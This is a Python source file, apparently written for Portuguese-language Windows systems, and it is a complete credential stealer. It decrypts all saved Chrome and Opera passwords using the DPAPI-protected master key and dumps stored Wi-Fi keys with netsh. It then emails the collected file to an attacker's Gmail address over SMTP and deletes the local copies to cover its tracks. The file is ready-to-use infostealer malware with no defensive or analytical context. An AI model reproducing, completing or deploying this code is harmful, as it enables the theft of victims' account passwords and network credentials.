from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from email.mime.base import MIMEBase
from Crypto.Cipher import AES
import smtplib, ssl, sys, os
from email import encoders
import subprocess as sp
import win32crypt
import sqlite3
import base64
import shutil
import json

operadb = "operadb.db"
chromedb = 'chrome.db'
path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'

ADDR = 'SENDER_GMAIL'
msg = MIMEMultipart()
msg['Subject'] = 'Hacking'
msg['From'] = ADDR
msg['To'] = 'RECEIVED'

# chrome
def getChrome(chrome):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome)

def getPassword():
    with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
        local = get_path.read()
        local = json.loads(local)
    key_master = base64.b64decode(local['os_crypt']["encrypted_key"])
    key_master = key_master[5:]
    key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
    return key_master

def decryptPayload(secret, payload):
    return secret.decrypt(payload)

def onSecret(aes_key, ivs):
    return AES.new(aes_key, AES.MODE_GCM, ivs)

def decryptPassword(buff, key_master):
    try:
        ivs = buff[3:15]
        payload = buff[15:]
        secret = onSecret(key_master, ivs)
        decrypted_passwd = decryptPayload(secret, payload)
        decrypted_passwd = decrypted_passwd[:-16].decode()
        return decrypted_passwd
    except Exception as err:
        return f'1: {err}'

#wifi
def Get_Wifi_Password():
    try:
        get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
        for network in get_wifi.split('\n'):
            if 'Todos os Perfis de Usuários' in network:
                two_point = network.find(':')
                info_network = network[two_point+2:]
                all_networks = sp.check_output(
                    ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                    )
                
                for passwords in all_networks.split('\n'):
                    if 'Nome SSID' in passwords:
                        two_point1 = network.find(':')
                        names = passwords[two_point1+2:]

                    if 'Conteúdo da Chave' in passwords:
                        two_point2 = network.find(':')
                        passwd = passwords[two_point2+2:]
                        get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
                        with open('password.csv', 'a') as wifi:
                            wifi.write(f'{get_network}')
                        wifi.close()
    except:
        pass
# send email
def Send_Email():
    try:
        files = open('password.csv', 'rb')
        att = MIMEBase('application', 'octet-stream')
        att.set_payload(files.read())
        encoders.encode_base64(att)
        att.add_header(
            'Content-Disposition', 'attachment; filename=password.csv'
        )
        files.close()
        msg.attach(att)

    except Exception as error:
        return error
    
    context = ssl.create_default_context()
    with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
        try:
            smtp.starttls(context=context)
            smtp.login(msg['From'], 'YOUR_PASSWORD_GMAIL')
            smtp.sendmail(msg['From'], msg['To'], msg.as_string())
            return 'Email Send Sucess'

        except Exception as errs:
            return errs

# opera or opera GX
def getEncryptionKey():
    try:
        try:
            local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        except:
            local_state_path = os.path.join(os.environ["userprofile"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except FileNotFoundError:
        pass

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decryptPasswordOP(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        print(e)

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as Err:
            return Err

if __name__ == "__main__":
    if not sys.platform == 'linux':
        Get_Wifi_Password()
        key_master = getPassword()
        login_db = os.environ['userprofile'] + os.sep + path_login
        shutil.copy2(login_db, chromedb)
        connect = sqlite3.connect(chromedb)
        cursor = connect.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for item in cursor.fetchall():
            url = item[0]
            username = item[1]
            encrypted_password = item[2]
            decrypted_password = decryptPassword(encrypted_password, key_master)
            save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
            with open('password.csv', 'a') as passwords:
                passwords.write(save)
            passwords.close()

        # opera    
        try:
            key = getEncryptionKey()
            try:
                db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
            except:
                db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
            file = open("password.csv", "a")
            file.write("\n\n============> NAVEGADOR OPERA <============\n")
            shutil.copyfile(db_path, operadb)
            db = sqlite3.connect(operadb)
            cursorOP = db.cursor()
            cursorOP.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            for row in cursorOP.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decryptPasswordOP(row[3], key)
                date_created = row[4]
                date_last_used = row[5]
                if username or password:
                    file.write(f"\nURL: {origin_url}\n")
                    file.write(f"URL: {action_url}\n")
                    file.write(f"User: {username}\n")
                    file.write(f"Senha: {password}\n")
                else:
                    continue
                if date_created != 86400000000 and date_created:
                    file.write(f"Data: {str(getChrome(date_created))}\n")
                if date_last_used != 86400000000 and date_last_used:
                    file.write(f"Última vez logado: {str(getChrome(date_last_used))}\n")
                file.write("="*55)
            cursorOP.close()
            db.close()
            file.close()
        except:
            pass

        Send_Email()
        cursor.close()
        connect.close()
    try:
        os.remove(chromedb)
        os.remove('password.csv')
        os.remove(operadb)
    except:
        pass